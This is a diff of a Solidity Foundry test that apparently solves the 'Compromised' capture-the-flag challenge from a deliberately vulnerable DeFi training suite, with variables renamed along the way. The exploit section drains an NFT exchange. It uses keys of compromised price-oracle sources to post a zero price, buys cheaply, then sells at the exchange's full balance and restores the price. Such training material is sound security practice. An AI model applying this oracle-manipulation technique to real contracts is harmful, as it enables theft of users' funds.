@@ -22,9 +22,9 @@ contract Compromised is DSTest {
     DamnValuableNFT internal damnValuableNFT;
     address payable internal attacker;
 
-    function setUp() public {
-        address[] memory sources = new address[](3);
+    address[] internal sources = new address[](3);
 
+    function setUp() public {
         sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
         sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
         sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;
@@ -89,27 +89,27 @@ contract Compromised is DSTest {
         // balance and "sell" the nft back
 
         vm.prank(sources[1]);
-        oracle.postPrice("DVNFT", 0);
+        trustfulOracle.postPrice("DVNFT", 0);
         vm.prank(sources[2]);
-        oracle.postPrice("DVNFT", 0);
+        trustfulOracle.postPrice("DVNFT", 0);
 
         vm.prank(attacker);
         uint256 tokenId = exchange.buyOne{value: 1}();
 
         vm.prank(sources[1]);
-        oracle.postPrice("DVNFT", address(exchange).balance);
+        trustfulOracle.postPrice("DVNFT", address(exchange).balance);
         vm.prank(sources[2]);
-        oracle.postPrice("DVNFT", address(exchange).balance);
+        trustfulOracle.postPrice("DVNFT", address(exchange).balance);
 
         vm.startPrank(attacker);
-        nft.approve(address(exchange), tokenId);
+        damnValuableNFT.approve(address(exchange), tokenId);
         exchange.sellOne(tokenId);
         vm.stopPrank();
 
         vm.prank(sources[1]);
-        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
         vm.prank(sources[2]);
-        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
 
         /** EXPLOIT END **/
         validation();
